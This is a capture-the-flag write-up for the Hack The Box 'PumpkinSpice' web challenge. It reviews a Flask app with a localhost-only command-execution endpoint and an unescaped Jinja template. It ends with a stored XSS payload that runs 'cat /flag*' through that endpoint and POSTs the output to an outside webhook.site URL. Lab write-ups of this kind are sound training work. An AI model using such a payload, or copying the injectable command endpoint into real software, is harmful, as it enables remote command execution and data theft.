---
title: PumpkinSpice - Hack The Box
date: 2024-12-31
---

<script setup>
    import ChallengeCard from "../../../../../.vitepress/components/ChallengeCard.vue";
</script>

# PumpkinSpice

![PumpkinSpice - Thumbnail](/ctf/hack-the-box/challenges/web/pumpkin-spice/thumbnail.svg){style="width: 100%; max-width:
400px; display: block; margin: 0 auto;"}

## Challenge Description

In the realm of cyberspace, a hacker collective known as the "Phantom Pumpkin Patch" has unearthed a sinister
Halloween-themed website, guarded by a devious vulnerability. As the moon casts an ominous glow, get ready to exploit
this spectral weakness

## Challenge Overview

This challenge presents a web application called **Pumpkin Spice**, where users can input their address to "receive a
free treat." The application has multiple endpoints for interacting with the server. Our goal is to exploit
vulnerabilities in the application to retrieve the flag.

![PumpkinSpice - Overview](/ctf/hack-the-box/challenges/web/pumpkin-spice/overview.png)

## Code review

The application uses **Flask** as its backend framework. The backend code is straightforward and is contained in a
single file, `app.py`.

```python
import subprocess
import time
from threading import Thread

from flask import Flask, request, render_template

app = Flask(__name__)

addresses = []


def start_bot():
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service

    host, port = "localhost", 1337
    HOST = f"http://{host}:{port}"

    options = Options()

    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-infobars")
    options.add_argument("--disable-background-networking")
    options.add_argument("--disable-default-apps")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-sync")
    options.add_argument("--disable-translate")
    options.add_argument("--hide-scrollbars")
    options.add_argument("--metrics-recording-only")
    options.add_argument("--mute-audio")
    options.add_argument("--no-first-run")
    options.add_argument("--dns-prefetch-disable")
    options.add_argument("--safebrowsing-disable-auto-update")
    options.add_argument("--media-cache-size=1")
    options.add_argument("--disk-cache-size=1")
    options.add_argument("--user-agent=HTB/1.0")

    service = Service(executable_path="/usr/bin/chromedriver")
    browser = webdriver.Chrome(service=service, options=options)

    browser.get(f"{HOST}/addresses")
    time.sleep(5)
    browser.quit()


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")


@app.route("/addresses", methods=["GET"])
def all_addresses():
    remote_address = request.remote_addr
    if remote_address != "127.0.0.1" and remote_address != "::1":
        return render_template("index.html", message="Only localhost allowed")

    return render_template("addresses.html", addresses=addresses)


@app.route("/add/address", methods=["POST"])
def add_address():
    address = request.form.get("address")

    if not address:
        return render_template("index.html", message="No address provided")

    addresses.append(address)
    Thread(target=start_bot, ).start()
    return render_template("index.html", message="Address registered")


@app.route("/api/stats", methods=["GET"])
def stats():
    remote_address = request.remote_addr
    if remote_address != "127.0.0.1" and remote_address != "::1":
        return render_template("index.html", message="Only localhost allowed")

    command = request.args.get("command")
    if not command:
        return render_template("index.html", message="No command provided")

    results = subprocess.check_output(command, shell=True, universal_newlines=True)
    return results


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=False)
```

The website has 4 endpoints:

- `/` - The main page where we can input our address
- `/addresses` - The page where we can see all the addresses that have been inputted
- `/add/address` - The endpoint to add an address
- `/api/stats` - The endpoint to run a command

The vulnerability is in the `/api/stats` endpoint. This endpoint allows us to run a command on the server. The command
is passed as a query parameter `command`. The command is executed using the `subprocess.check_output` function. This
function is used to run a command and return its output. But the `/api/stats` endpoint is only accessible from
localhost.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="lean">
    <title>🎃 Pumpkin Spice 🎃</title>
</head>
<body>
<h1>System stats:</h1>
<p id="stats"></p>
<h1>Addresses:</h1>
{% for address in addresses %}
<p>{{ address|safe }}</p>
{% endfor %}
<script src="/static/js/script.js"></script>
</body>
</html>
```

The HTML code above is the `addresses.html` file. This file is used to display all the addresses that have been inputted
by the user. The addresses are displayed using a for loop. The `address|safe` filter is used to tell **Jinja** that the
address is safe and should not be escaped. That means that the content of the address variable will be rendered exactly
as it is, without additional HTML escaping. This allows any HTML or JavaScript included in the address to be displayed
or executed directly in the browser.

This is a classic example of a **Cross-Site Scripting (XSS)** vulnerability. An attacker can input a malicious script
as an address, and when the address is displayed on the page, the script will be executed in the context of the user's
browser.

## Exploitation - XSS

To exploit this vulnerability, we need to input a malicious script as an address. The script will be executed when the
address is displayed on the page. We can use a script that sends a request to the `/api/stats` endpoint with a command
to read the flag file. And them send the output to a `webhook.site` endpoint.

```html

<script>
    fetch("/api/stats?command=cat+/flag*")
        .then(async data => {
            fetch("https://webhook.site/your-webhook-id", {
                method: "POST",
                body: await data.text(),
            })
        })
</script>
```

After inputting the script as an address, we can see the flag in the `webhook.site` endpoint.

![PumpkinSpice - Flag](/ctf/hack-the-box/challenges/web/pumpkin-spice/flag.png)

We've successfully exploited the vulnerability and retrieved the flag.

<ChallengeCard
    challengeType="web"
    challengeName="PumpkinSpice"
    htbCardLink="https://www.hackthebox.com/achievement/challenge/585215/625"
/>

## References

- [Webhook.site](https://webhook.site)
